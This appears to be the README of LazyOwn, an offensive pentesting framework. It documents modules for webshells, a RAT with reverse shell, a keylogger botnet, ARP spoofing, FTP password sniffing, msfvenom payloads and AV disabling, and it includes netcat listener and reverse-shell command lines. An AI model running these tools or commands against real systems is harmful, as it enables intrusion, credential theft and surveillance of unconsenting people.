# LazyOwn

![LazyOwn_Redteam_framework](https://github.com/user-attachments/assets/d713f163-5f4d-433f-befd-6776d43051da)


![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![image](https://github.com/user-attachments/assets/961783c2-cd57-4cc2-ab4c-53fde581db79)
 ![image](https://github.com/user-attachments/assets/79052f87-f87c-4b32-a4a2-854113ca3a4c)
  [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0) ![image](https://github.com/user-attachments/assets/b69f1d31-c075-4713-a44e-a40a034a7407) ![image](https://github.com/user-attachments/assets/df82a669-be0c-4a03-bd98-842a67baaef6)

![Banner](https://github.com/user-attachments/assets/2e9170f3-3b9e-4ce4-8e9e-ef98f7bf386c)


```sh
██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
```

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)

![LazyOwn1](https://github.com/user-attachments/assets/1debaed0-8f84-4079-ad2f-48cc4cfd9d95)

LazyOwn comes with ABSOLUTELY NO WARRANTY. This is free software, and you are  welcome to redistribute it under the terms of the GNU General Public License v3.
See the LICENSE file for details about using this software.

LazyOwn Framework is a powerful and versatile security framework designed to automate and streamline pentesting and vulnerability analysis tasks. This interactive environment combines multiple tools and scripts, making it easier for cybersecurity professionals to work through various stages of the security assessment lifecycle. With an intuitive command-line interface, LazyOwn allows users to configure specific parameters, execute custom scripts, and obtain real-time results, all from a single platform.

Key Features:

Interactive Interface:

Interactive shell with user-friendly commands for configuring and running scripts.
Ability to display and adjust custom parameters applicable to different scripts.
Task Automation:

Automates common pentesting tasks such as vulnerability scanning, web application fuzzing, brute force attacks, and more.
Integration with popular tools and custom scripts for comprehensive testing coverage on Parrot Sec.
Real-Time Visualization:

Real-time output display of script execution, allowing users to see results instantly and react swiftly.
Modularity and Extensibility:

Designed to be extensible, enabling users to easily add and customize scripts.
Supports multiple scripting languages, including Python and Bash.
Flexible Configuration:

Ability to set specific parameters like IP addresses, API keys, HTTP methods, request data, and more, providing complete control over executed scripts.
Typical Use:

Parameter Configuration:

Users can set required parameters using commands like set target_ip 192.168.1.1 to define the target IP address.
Script Execution:

Execute predefined scripts for various tasks, such as run lazygptcli to interact with GPT using a configured prompt and API key.
Results Visualization:

Script results are displayed in the console in real-time, providing immediate feedback on progress and findings.
Additional Modules:

LazyOwn includes various specialized modules such as:

lazyownrat and lazyownratcli: For running remote access tools with configurable parameters.
lazyftpsniff and lazysniff: For network sniffing on specified interfaces.
lazysearch_bot and lazygptcli: For interacting with search APIs and GPT-based tools.
lazyhoneypot: For setting up email-based honeypots.
lazynetbios: For NetBIOS enumeration across IP ranges.
lazywerkzeugdebug: For testing Werkzeug in debug mode.
Background:

Originally designed to automate the search and analysis of binaries with special permissions on Linux and Windows systems, LazyOwn has evolved to encompass a broader range of functionalities. The project includes scripts that extract information from GTFOBins, analyze binaries on the system, and generate options based on the collected data.

![LazyOwnGris3](https://github.com/user-attachments/assets/04f48e49-5d7f-4c3d-af6d-81d05dbdacbf)


LazyOwn on Reddit

Revolutionize Your Pentesting with LazyOwn: Automate the intrusion on Linux, MAC OSX, and Windows VICTIMS

<https://www.reddit.com/r/LazyOwn/>


<https://github.com/grisuno/LazyOwn/assets/1097185/eec9dbcc-88cb-4e47-924d-6dce2d42f79a>

Discover LazyOwn, the ultimate solution for automating the pentesting workflow to attack Linux, MacOSX and Windows systems. Our powerful tool simplifies pentesting, making it more efficient and effective. Watch this video to learn how LazyOwn can streamline your security assessments and enhance your cybersecurity toolkit.

```sh
LazyOwn> set rhost 192.168.1.1
[SET] rhost set to 192.168.1.1
LazyOwn> run lazynmap
[INFO] Running Nmap scan on 192.168.1.1
...
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/9f30a1a3-dfe8-4cc1-9bd7-76c21bdc64b7)

LazyOwn is ideal for cybersecurity professionals seeking a centralized and automated solution for their pentesting needs, saving time and enhancing efficiency in identifying and exploiting vulnerabilities.

![Captura de pantalla 2024-05-22 021136](https://github.com/grisuno/LazyOwn/assets/1097185/9a348e76-d667-4526-bdef-863159ba452d)

## Requisitos

- Python 3.x
- Módulos de Python:
  - python-libnmap
  - pwn
  - groq
  - PyPDF2
  - docx
  - python-docx
  - olefile
  - exifread
  - pycryptodome
  - impacket
  - pandas
  - colorama
  - tabulate
  - pyarrow
  - keyboard
  - flask-unsign
  - name-that-hash
  - certipy-ad
  - ast
  
- `subprocess` (incluido en la biblioteca estándar de Python)
- `platform` (incluido en la biblioteca estándar de Python)
- `tkinter` (Opcional para el GUI)
- `numpy` (Opcional para el GUI)
-

## Instalación

1. Clona el repositorio:

```sh
git clone https://github.com/grisuno/LazyOwn.git
cd LazyOwn
```

2. Instala las dependencias de Python:

```sh
./install.sh
```

## Uso

```sh
./run or ./fast_run_as_r00t.sh 

./run --help
    [;,;] LazyOwn release/0.1.20
    Uso: ./run [opciones]
    Opciones:
      --help         Muestra esta ayuda
      -v             Muestra la version
      -c             Ejecuta un comando del LazyOwn ej: ping
      --no-banner    No muestra el Banner
      -s             Run as r00t 

./fast_run_as_r00t.sh --vpn 1 (the number id of your file in vpn directory)
```

```
Use set <parameter> <value> to configure parameters.
Use show to display the current parameter values.
Use run <script_name> to execute a script with the set parameters.
Use exit to exit the CLI.

Once the shell is running, you can use the following commands:

list: Lists all LazyOwn Modules.
set <parameter> <value>: Sets the value of a parameter. For example, set rhost 192.168.1.1.
show: Displays the current values of all parameters.
run <script>: Executes a specific script available in the framework.
Available Scripts

┌─[LazyOwn👽192.168.1.92 ~/home/gris/tools/LazyOwn][10.10.11.29][http://lantern.htb/]
└╼ $ ls
    [+] Available scripts to run: [👽]
    [+] lazysearch                lazysearch_gui            lazyown                 [👽]
    [+] update_db                 lazynmap                  lazyaslrcheck           [👽]
    [+] lazynmapdiscovery         lazygptcli                lazyburpfuzzer          [👽]
    [+] lazymetaextract0r         lazyreverse_shell         lazyattack              [👽]
    [+] lazyownratcli             lazyownrat                lazygath                [👽]
    [+] lazysniff                 lazynetbios               lazybotnet              [👽]
    [+] lazybotcli                lazyhoneypot              lazysearch_bot          [👽]
    [+] lazylfi2rce               lazylogpoisoning          lazymsfvenom            [👽]
    [+] lazypathhijacking         lazyarpspoofing           lazyftpsniff            [👽]
    [+] lazyssh77enum             lazywerkzeugdebug       [👽]
┌─[LazyOwn👽192.168.1.92 ~/home/gris/tools/LazyOwn][10.10.11.29][http://lantern.htb/]
└╼ $ 
        
┌─[LazyOwn👽192.168.1.92 ~/home/gris/tools/LazyOwn][10.10.11.29][http://lantern.htb/]
└╼ $ ?

Documented commands (type help <topic>):
========================================
EOF                dnsmap              ldapdomaindump       searchhash      
acknowledgearp     download_exploit    list                 seo             
acknowledgeicmp    download_resources  lynis                sessionssh      
addhosts           encode              medusa               sessionsshstrace
alias              encoderpayload      msf                  set             
apropos            encrypt             nbtscan              set_proxychains 
arpscan            enum4linux          nikto                sh              
asprevbase64       exit                nmapscript           shellcode       
banner             finalrecon          nmapscripthelp       show            
base64decode       find                openssl_sclient      skipfish        
base64encode       fixel               payload              smbclient       
bloodhound         fixperm             ping                 smbmap          
chisel             ftp                 portdiscover         smbserver       
clean              getcap              ports                smtpuserenum    
clock              getnpusers          portservicediscover  snmpcheck       
cme                getseclist          proxy                socat           
conptyshell        gobuster            psexec               sqlmap          
cp                 gospider            pwd                  ss              
cports             grisun0             pwncatcs             ssh             
createcookie       hashcat             py3ttyup             sshd            
createcredentials  help                pyautomate           swaks           
createdll          hostdiscover        qa                   tcpdump_capture 
createhash         hydra               rdp                  tcpdump_icmp    
createrevshell     id_rsa              responder            tshark_analyze  
createwebshell     ignorearp           rev                  urldecode       
createwinrevshell  ignoreicmp          revwin               urlencode       
creds              img2cookie          rhost                vpn             
decode             ip                  rot                  wfuzz           
decrypt            john2hash           rpcclient            whatweb         
dig                launchpad           rpcdump              winbase64payload
dirsearch          lazypwn             rubeus               wrapper         
disableav          lazyscript          run                  www             
dnsenum            lazywebshell        samrdump           

┌─[LazyOwn👽192.168.1.92 ~/home/gris/tools/LazyOwn][10.10.11.29][http://lantern.htb/]
└╼ $ 



```
## Tag in youtube
<https://www.youtube.com/hashtag/lazyown>


```sh
LazyOwn> set binary_name my_binary
LazyOwn> set rhost 192.168.1.100
LazyOwn> set api_key my_api_key
LazyOwn> run lazysearch
LazyOwn> run lazynmap
LazyOwn> exit
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/6c8a0b35-cde5-42b3-be73-eb45b3f821f0)

For searching within the scraped database obtained from GTFOBins.

```sh
python3 lazysearch.py binario_a_buscar
```

## Searches with GUI
Additional Features and Enhancements:
AutocompleteEntry:

A filter has been added to remove None values from the autocomplete list.
New Attack Vector:

A "New Attack Vector" button has been added to the main interface.
Functionality has been implemented to add a new attack vector and save the updated data in Parquet files.
Export to CSV:

A "Export to CSV" button has been added to the main interface.
Functionality has been implemented to export DataFrame data to a user-selected CSV file.
Usage:

Add a New Attack Vector: Click the "New Attack Vector" button, fill in the fields, and save.
Export to CSV: Click the "Export to CSV" button and select the location to save the CSV file.
New Function scan_system_for_binaries:

Implements system-wide binary searches using the file command to determine if a file is binary.
Uses os.walk to traverse the file system.
Results are displayed in a new window within the GUI.
Button to Search for Binaries:

A "Search System for Binaries" button has been added to the main interface, which calls the scan_system_for_binaries function.
Note:

The is_binary function uses the Unix file command to determine if a file is a binary executable. If you are on a different operating system, you will need to adjust this method for compatibility.
This implementation can be resource-intensive as it traverses the entire file system. You may consider adding additional options to limit the search to specific directories or filter for certain file types.

```sh
python3 LazyOwnExplorer.py
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/87c4be70-66a4-4e84-bdb6-fdfdb89a3f94)



```sh
python3 lazyown.py
```

If you want to update, we proceed as follows:

```sh
cd LazyOwn
rm *.csv
rm *.parquet
./update_db.sh
```

## Use mode LazyOwn WebShells

LazyOwn Webshell Collection is a collection of webshells for our framework, which allows us to establish a webshell on the machine where we run LazyOwn using various programming languages. Essentially, LazyOwn Webshell raises a web server within the modules directory, making it accessible via a web browser. This allows us to both make the modules available separately through the web and access the cgi-bin directory, where there are four shells: one in Bash, another in Perl, another in Python, and one in ASP, in case the target is a Windows machine.

```sh
lazywebshell
```

y listo ya podemos acceder a cualquiera de estas url:

<http://localhost:8080/cgi-bin/lazywebshell.sh>

<http://localhost:8080/cgi-bin/lazywebshell.py>

<http://localhost:8080/cgi-bin/lazywebshell.asp>

<http://localhost:8080/cgi-bin/lazywebshell.cgi>

![image](https://github.com/grisuno/LazyOwn/assets/1097185/fc0ea814-7044-4f8f-8979-02f9579e9df9)

## Use Lazy MSFVenom to Reverse Shell

    Executes the `msfvenom` tool to generate a variety of payloads based on user input.

    This function prompts the user to select a payload type from a predefined list and runs the corresponding
    `msfvenom` command to create the desired payload. It handles tasks such as generating different types of
    payloads for Linux, Windows, macOS, and Android systems, including optional encoding with Shikata Ga Nai for C payloads.

    The generated payloads are moved to a `sessions` directory, where appropriate permissions are set. Additionally,
    the payloads can be compressed using UPX for space efficiency. If the selected payload is an Android APK,
    the function will also sign the APK and perform necessary post-processing steps.

    :param line: Command line arguments for the script.
    :return: None

```sh
run lazymsfvenom or venom
```

## Use Lazy PATH Hijacking

A file will be created in /tmp with the name binary_name set in the payload, initialized with gzip in memory, and using bash in the payload. To set the payload from the JSON, use the payload command to execute. Use:

```sh
lazypathhijacking
```

## Use mode LazyOwn RAT

LazyOwn RAT is a simple yet powerful Remote Administration Tool. It features a screenshot function that captures the server's screen, an upload command that allows us to upload files to the compromised machine, and a C&C mode where commands can be sent to the server. It operates in two modes: client mode and server mode. There is no obfuscation, and the RAT is based on BasicRat. You can find it on GitHub at https://github.com/awesome-security/basicRAT and at https://github.com/hash3liZer/SillyRAT. Although the latter is much more comprehensive, I just wanted to implement screenshot capture, file uploads, and command sending. Perhaps in the future, I will add webcam viewing functionality, but that will come later.

```sh
usage: lazyownserver.py [-h] [--host HOST] [--port PORT] --key KEY
lazyownserver.py: error: the following arguments are required: --key

usage: lazyownclient.py [-h] --host HOST --port PORT --key KEY
lazyownclient.py: error: the following arguments are required: --host, --port, --key

LazyOwn> run lazyownclient
[?] lhost and lport and rat_key must be set

LazyOwn> run lazyownserver
[?] rhost and lport and rat_key must be set

luego los comandos son:

upload /path/to/file
donwload /path/to/file
screenshot
sysinfo
fix_xauth #to fix xauth xD
lazyownreverse 192.168.1.100 8888 #Reverse shell to 192.168.1.100 on port 8888 ready to C&C
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/2bb7ec40-0d89-4ca6-87ff-2baa62781648)

## Use mode Lazy Meta Extract0r

LazyMeta Extract0r is a tool designed to extract metadata from various types of files, including PDF, DOCX, OLE files (such as DOC and XLS), and several image formats (JPG, JPEG, TIFF). This tool will traverse a specified directory, search for files with compatible extensions, extract the metadata, and save it to an output file.

[*] Iniciando: LazyMeta extract0r [;,;]

usage: lazyown_metaextract0r.py [-h] --path PATH
lazyown_metaextract0r.py: error: the following arguments are required: --path

```sh
python3 lazyown_metaextract0r.py --path /home/user
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/9ec77c01-4bc1-48ab-8c34-7457cff2f79f)

## Use mode decrypt encrypt

A encryption method that allows us to both encrypt files and decrypt them if we have the key, of course.

![Captura de pantalla 2024-06-08 231900](https://github.com/grisuno/LazyOwn/assets/1097185/15158dbd-6cd6-4e20-a237-6c89983d42ce)

```sh
encrypt path/to/file key # to encrypt
decrypt path/to/file.enc key #to decrypt
```

## Uso modo LazyNmap

The use of Lazynmap provides us with an automated script for a target, in this case, 127.0.0.1, using Nmap. The script requires administrative permissions via sudo. It also includes a network discovery module to identify what is present in the IP segment you are in. Additionally, the script can now be called without parameters using the alias nmap or with the command run lazynmap.

![image](https://github.com/grisuno/LazyOwn/assets/1097185/48a38836-6cf5-4676-bea8-063e0b5cf7ad)

```sh
./lazynmap.sh -t 127.0.0.1 
```

## Usage of LazyOwn GPT One Liner CLI Assistant and Researcher

Discover the revolution in automating pentesting tasks with the LazyOwn GPT One Liner CLI Assistant! This incredible script is part of the LazyOwn tool suite, designed to make your life as a pentester more efficient and productive.

🚀 Key Features:

Intelligent Automation: Leverages the power of Groq and advanced natural language models to generate precise and efficient commands based on your specific needs.
User-Friendly Interface: With a simple prompt, the assistant generates and executes one-liner scripts, drastically reducing the time and effort involved in creating complex commands.
Continuous Improvement: Continuously transforms and optimizes its knowledge base to provide you with the best solutions, adapting to each situation.
Simplified Debugging: Enable debug mode to obtain detailed information at every step, facilitating the identification and correction of errors.
Seamless Integration: Works effortlessly within your workspace, harnessing the power of the Groq API to deliver quick and accurate responses.
🔒 Security and Control:

Safe Error Handling: Intelligently detects and responds to execution errors, ensuring you maintain full control over each generated command.
Controlled Execution: Before executing any command, it requests your confirmation, giving you peace of mind knowing exactly what is being executed on your system.
🌐 Easy Configuration:

Set up your API key in seconds and start enjoying all the benefits offered by the LazyOwn GPT One Liner CLI Assistant. A quick start guide is available to help you configure and maximize the potential of this powerful tool.

🎯 Ideal for Pentesters and Developers:

Optimize Your Processes: Simplify and accelerate command generation in your security audits.
Continuous Learning: The knowledge base is constantly updated and improved, always providing you with the latest best practices and solutions.
With the LazyOwn GPT One Liner CLI Assistant, transform the way you work, making it faster, more efficient, and secure. Stop wasting time on repetitive and complex tasks, and focus on what truly matters: discovering and resolving vulnerabilities!

Join the pentesting revolution with LazyOwn and take your productivity to the next level!

[?] Usage: python lazygptcli.py --prompt "<your prompt>" [--debug]

[?] Options:

--prompt "The prompt for the programming task (required)."
--debug, -d "Enables debug mode to display debug messages."
--transform "Transforms the original knowledge base into an enhanced base using Groq."
[?] Ensure you configure your API key before running the script:
export GROQ_API_KEY=<your_api_key>
[->] Visit: https://console.groq.com/docs/quickstart (not a sponsored link)

Requirements:

Python 3.x
A valid Groq API key
Steps to Obtain the Groq API Key:
Visit Groq Console (https://console.groq.com/docs/quickstart) to register and obtain an API key.
```sh
export GROQ_API_KEY=<tu_api_key>
python3 lazygptcli.py --prompt "<tu prompt>" [--debug]          
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/90a95c2a-48d3-4b02-8055-67656c1e71c9)

## Usage of lazyown_bprfuzzer.py

Provide the arguments as specified by the script's requests: The script will require the following arguments:



usage: lazyown_bprfuzzer.py [-h] --url URL [--method METHOD] [--headers HEADERS] [--params PARAMS] [--data DATA] [--json_data JSON_DATA]
                   [--proxy_port PROXY_PORT] [-w WORDLIST] [-hc HIDE_CODE]
--url: The URL to which the request will be sent (required).
--method: The HTTP method to use, such as GET or POST (optional, default: GET).
--headers: The request headers in JSON format (optional, default: {}).
--params: The URL parameters in JSON format (optional, default: {}).
--data: The form data in JSON format (optional, default: {}).
--json_data: The JSON data for the request in JSON format (optional, default: {}).
--proxy_port: The port for the internal proxy (optional, default: 8080).
-w, --wordlist: The path to the wordlist for fuzzing mode (optional).
-hc, --hide_code: The HTTP status code to hide in the output (optional).
Make sure to provide the required arguments to ensure the script runs correctly.
```sh
python3 lazyown_bprfuzzer.py --url "http://example.com" --method POST --headers '{"Content-Type": "LAZYFUZZ"}'
```

Form 2: Advanced Usage

If you wish to take advantage of the advanced features of the script, such as request replay or fuzzing, follow these steps:

Request Replay:

To utilize the request replay functionality, provide the arguments as indicated earlier.
During execution, the script will ask if you want to repeat the request. Enter 'y' to repeat or 'n' to terminate the repeater.
Fuzzing:

To use the fuzzing functionality, make sure to provide a wordlist with the -w or --wordlist argument.
The script will replace the word LAZYFUZZ in the URL and other data with the words from the provided wordlist.
During execution, the script will display the results of each fuzzing iteration.
These are the basic and advanced ways to use the lazyburp.py script. Depending on your needs, you can choose the method that best fits your specific situation.

```sh
python3 lazyown_bprfuzzer.py \                                                                                                           ─╯
    --url "http://127.0.0.1:80/LAZYFUZZ" \
    --method POST \
    --headers '{"User-Agent": "LAZYFUZZ"}' \
    --params '{"param1": "value1", "param2": "LAZYFUZZ"}' \
    --data '{"key1": "LAZYFUZZ", "key2": "value2"}' \
    --json_data '{"key3": "LAZYFUZZ"}' \
    --proxy_port 8080 \
    -w /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt \
    -hc 501
```

```sh
python3 lazyown_bprfuzzer.py \                                                                                                           ─╯
    --url "http://127.0.0.1:80/LAZYFUZZ" \
    --method POST \
    --headers '{"User-Agent": "LAZYFUZZ"}' \
    --params '{"param1": "value1", "param2": "LAZYFUZZ"}' \
    --data '{"key1": "LAZYFUZZ", "key2": "value2"}' \
    --json_data '{"key3": "LAZYFUZZ"}' \
    --proxy_port 8080 \
    -w /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt \
 
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/dc66fdc2-cd7d-4b79-92c6-dd43d376ee0e)
Note: To use the dictionary, run the following command within /usr/share/seclists:

```sh
now the command 'getseclist' do that automated.
wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
&& unzip SecList.zip \
&& rm -f SecList.zip
```

## Usage of LazyOwn FTP Sniff Mode

This module is used to search for passwords on FTP servers across the network. Some may say that FTP is no longer used, but you would be surprised at the critical infrastructure environments I've seen with massive FTP services running on their servers. :)

```sh
set device eth0
run lazyftpsniff
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/d2d1c680-fc03-4f60-adc4-20248f3e3859)

## Uso modo LazyReverseShell

Listen

```sh
nc -nlvp 1337 #o el puerto que escojamos 
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/dfb7a81d-ac7f-4b8b-8f1f-717e058260b5)

para luego en la maquina victima

```sh
./lazyreverse_shell.sh --ip 127.0.0.1 --puerto 1337
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/b489be5d-0b53-4054-995f-6106c9c95190)

## Usage of Lazy Curl to Recon Mode

The module is located in the modules directory and is used as follows:

```sh
chmod +x lazycurl.sh
```

and then

```sh
./lazycurl.sh --mode GET --url http://10.10.10.10
```

Usage.

GET:

```sh
./lazycurl.sh --mode GET --url http://10.10.10.10
```

POST:

```sh
./lazycurl.sh --mode POST --url http://10.10.10.10 --data "param1=value1&param2=value2"
```

TRACE:

```sh
./lazycurl.sh --mode TRACE --url http://10.10.10.10
```sh

File upload:

```sh
./lazycurl.sh --mode UPLOAD --url http://10.10.10.10 --file file.txt
```

wordlist bruteforce mode:

```sh
./lazycurl.sh --mode BRUTE_FORCE --url http://10.10.10.10 --wordlist /usr/share/wordlists/rockyou.txt
```

Make sure to adjust the parameters according to your needs and that the values you provide for the options are valid for each case.

## Usage of ARPSpoofing Mode

The script provides an ARP spoofing attack using Scapy. In the payload, you must set the lhost, rhost, and the device that you will use to perform the ARP spoofing.

```sh
set rhost 192.168.1.100
set lhost 192.168.1.1
set device eth0
run lazyarpspoofing
```

## Usage of LazyGathering Mode

This script provides an X-ray view of the system in question where the tool is being executed, offering insights into its configuration and state.

![image](https://github.com/grisuno/LazyOwn/assets/1097185/6d1416f9-10cd-4316-8a62-92c3f10082e0)

```sh
run lazygath
```

## Usage of Lazy Own LFI RFI 2 RCE Mode

The LFI RFI 2 RCE mode is designed to test some of the more well-known payloads against the parameters specified in payload.json. This allows for a comprehensive assessment of Local File Inclusion (LFI), Remote File Inclusion (RFI), and Remote Code Execution (RCE) vulnerabilities in the target system.

![image](https://github.com/grisuno/LazyOwn/assets/1097185/4259a469-8c8e-4d11-8db5-39a3bf15059c)

```sh
payload
run lazylfi2rce
```





### Usage of LazyOwn Sniffer Mode

<https://www.youtube.com/watch?v=_-DDiiMrIlE>

The sniffer mode allows capturing network traffic through interfaces using the `-i` option, which is mandatory. There are many other optional settings that can be adjusted as needed.

#### Usage
```bash
usage: lazysniff.py [-h] -i INTERFACE [-c COUNT] [-f FILTER] [-p PCAP]
lazysniff.py: error: the following arguments are required: -i/--interface


![Captura de pantalla 2024-06-05 031231](https://github.com/grisuno/LazyOwn/assets/1097185/db1e05a0-026e-414f-9ec6-0a9ef2cb06fe)

To use the sniffer from the framework, you must configure the device with the command:

```sh
run lazysniff
or just
sniff
```

### Experimental Obfuscation Using PyInstaller

This feature is in experimental mode and does not work fully due to a path issue. Soon, it will support obfuscation using PyInstaller.


```sh
./py2el.sh
```

## Experimental NetBIOS Exploit

This feature is in experimental mode as it is not functioning yet... (coming soon, possibly an implementation of EternalBlue among other things...)


```sh
run lazynetbios
```

## Experimental LazyBotNet with Keylogger for Windows and Linux

This feature is in experimental mode, and the decryption of the keylogger logs is not functioning xD. Here we see for the first time in action the `payload` command, which sets all the configuration in our `payload.json`, allowing us to preload the configuration before starting the framework.


```sh
payload
run lazybotnet
```

## Interactive Menus

The script features interactive menus to select actions to be performed. In server mode, it displays relevant options for the victim machine, while in client mode, it shows options relevant to the attacking machine.

### Clean Interruption

The script handles the SIGINT signal (usually generated by Control + C) to exit cleanly.

## License

This project is licensed under the GPL v3 License. The information contained in GTFOBins is owned by its authors, to whom we are immensely grateful for the information provided.

## Acknowledgments ✌

A special thanks to [GTFOBins](https://gtfobins.github.io/) for the valuable information they provide and to you for using this project. Also, thanks for your support Tito S4vitar! who does an extraordinary job of outreach. Of course, I use the `extractPorts` function in my `.zshrc` :D

### Thanks to pwntomate 🍅

An excellent tool that I adapted a bit to work with the project; all credits go to its author honze-net Andreas Hontzia. Visit and show love to the project: <https://github.com/honze-net/pwntomate>

### Thanks to Sicat 🐈

An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. <https://github.com/justakazh/sicat/>

## Abstract

LazyOwn is a framework that streamlines its workflow and automates many tasks and tests through aliases and various tools, functioning like a Swiss army knife with multipurpose blades for hacking xD.

## Lazyducky_digispark

![LazyOwn](https://github.com/user-attachments/assets/b7e8c257-c0de-4033-bf4b-57ebc87dcb97)

      Compiles and uploads an .ino sketch to a Digispark device using Arduino CLI and Micronucleus.

        This method checks if Arduino CLI and Micronucleus are installed on the system.
        If they are not available, it installs them. It then compiles a Digispark sketch 
        and uploads the generated .hex file to the Digispark device.

        The method performs the following actions:
        1. Checks for the presence of Arduino CLI and installs it if not available.
        2. Configures Arduino CLI for Digispark if not already configured.
        3. Generates a reverse shell payload and prepares the sketch for Digispark.
        4. Compiles the prepared Digispark sketch using Arduino CLI.
        5. Checks for the presence of Micronucleus and installs it if not available.
        6. Uploads the compiled .hex file to the Digispark device using Micronucleus.

        Args:
            line (str): Command line input provided by the user, which may contain additional parameters.

        Returns:
            None: The function does not return any value but may modify the state of the system
                by executing commands.


# Documentation by readmeneitor.py

Documentation automatically created by the script `readmeneitor.py` created for this project; maybe one day it will have its own repo, but for now, I don't see it as necessary.

<!-- START UTILS -->
# UTILS.md Documentation  by readmeneitor.py

## parse_ip_mac
Extracts IP and MAC addresses from a formatted input string using a regular expression.

The input string is expected to be in the format: 'IP: (192.168.1.222) MAC: ec:c3:02:b0:4c:96'.
The function uses a regular expression to match and extract the IP address and MAC address from the input.

Args:
    input_string (str): The formatted string containing the IP and MAC addresses.

Returns:
    tuple: A tuple containing the extracted IP address and MAC address. If the format is incorrect, returns (None, None).

## create_arp_packet
Constructs an ARP packet with the given source and destination IP and MAC addresses.

The function creates both Ethernet and ARP headers, combining them into a complete ARP packet.

Args:
    src_mac (str): Source MAC address in the format 'xx:xx:xx:xx:xx:xx'.
    src_ip (str): Source IP address in dotted decimal format (e.g., '192.168.1.1').
    dst_ip (str): Destination IP address in dotted decimal format (e.g., '192.168.1.2').
    dst_mac (str): Destination MAC address in the format 'xx:xx:xx:xx:xx:xx'.

Returns:
    bytes: The constructed ARP packet containing the Ethernet and ARP headers.

## send_packet
Sends a raw ARP packet over the specified network interface.

The function creates a raw socket, binds it to the specified network interface, and sends the given packet.

Args:
    packet (bytes): The ARP packet to be sent.
    iface (str): The name of the network interface to use for sending the packet (e.g., 'eth0').

Raises:
    OSError: If an error occurs while creating the socket or sending the packet.

## load_version
Load the version number from the 'version.json' file.

This function attempts to open the 'version.json' file and load its contents. 
If the file is found, it retrieves the version number from the JSON data. 
If the version key does not exist, it returns a default version 'release/v0.0.14'. 
If the file is not found, it also returns the default version.

Returns:
- str: The version number from the file or the default version if the file is not found or the version key is missing.

## print_error
Prints an error message to the console.

This function takes an error message as input and prints it to the console
with a specific format to indicate that it is an error.

:param error: The error message to be printed.
:type error: str
:return: None

## print_msg
Prints a message to the console.

This function takes a message as input and prints it to the console
with a specific format to indicate that it is an informational message.

:param msg: The message to be printed.
:type msg: str
:return: None

## print_warn
Prints a warning message to the console.

This function takes a warning message as input and prints it to the console
with a specific format to indicate that it is a warning.

:param warn: The warning message to be printed.
:type warn: str
:return: None

## signal_handler
Handles signals such as Control + C and shows a message on how to exit.

This function is used to handle signals like Control + C (SIGINT) and prints
a warning message instructing the user on how to exit the program using the
commands 'exit', 'q', or 'qa'.

:param sig: The signal number.
:type sig: int
:param frame: The current stack frame.
:type frame: frame
:return: None

## check_rhost
Checks if the remote host (rhost) is defined and shows an error message if it is not.

This function verifies if the `rhost` parameter is set. If it is not defined,
an error message is printed, providing an example and directing the user to
additional help.

:param rhost: The remote host to be checked.
:type rhost: str
:return: True if rhost is defined, False otherwise.
:rtype: bool

## check_lhost
Checks if the local host (lhost) is defined and shows an error message if it is not.

This function verifies if the `lhost` parameter is set. If it is not defined,
an error message is printed, providing an example and directing the user to
additional help.

:param lhost: The local host to be checked.
:type lhost: str
:return: True if lhost is defined, False otherwise.
:rtype: bool

## check_lport
Checks if the local port (lport) is defined and shows an error message if it is not.

This function verifies if the `lport` parameter is set. If it is not defined,
an error message is printed, providing an example and directing the user to
additional help.

:param lport: The local port to be checked.
:type lport: int or str
:return: True if lport is defined, False otherwise.
:rtype: bool

## is_binary_present
Internal function to verify if a binary is present on the operating system.

This function checks if a specified binary is available in the system's PATH
by using the `which` command. It returns True if the binary is found and False
otherwise.

:param binary_name: The name of the binary to be checked.
:type binary_name: str
:return: True if the binary is present, False otherwise.
:rtype: bool

## handle_multiple_rhosts
Internal function to handle multiple remote hosts (rhost) for operations.

This function is a decorator that allows an operation to be performed across
multiple remote hosts specified in `self.params["rhost"]`. It converts a single
remote host into a list if necessary, and then iterates over each host,
performing the given function with each host. After the operation, it restores
the original remote host value.

:param func: The function to be decorated and executed for each remote host.
:type func: function
:return: The decorated function.
:rtype: function

## check_sudo
Checks if the script is running with superuser (sudo) privileges, and if not,
restarts the script with sudo privileges.

This function verifies if the script is being executed with root privileges
by checking the effective user ID. If the script is not running as root,
it prints a warning message and restarts the script using sudo.

:return: None

## activate_virtualenv
Activates a virtual environment and starts an interactive shell.

This function activates a virtual environment located at `venv_path` and then
launches an interactive bash shell with the virtual environment activated.

:param venv_path: The path to the virtual environment directory.
:type venv_path: str
:return: None

## parse_proc_net_file
Internal function to parse a /proc/net file and extract network ports.

This function reads a file specified by `file_path`, processes each line to
extract local addresses and ports, and converts them from hexadecimal to decimal.
The IP addresses are converted from hexadecimal format to standard dot-decimal
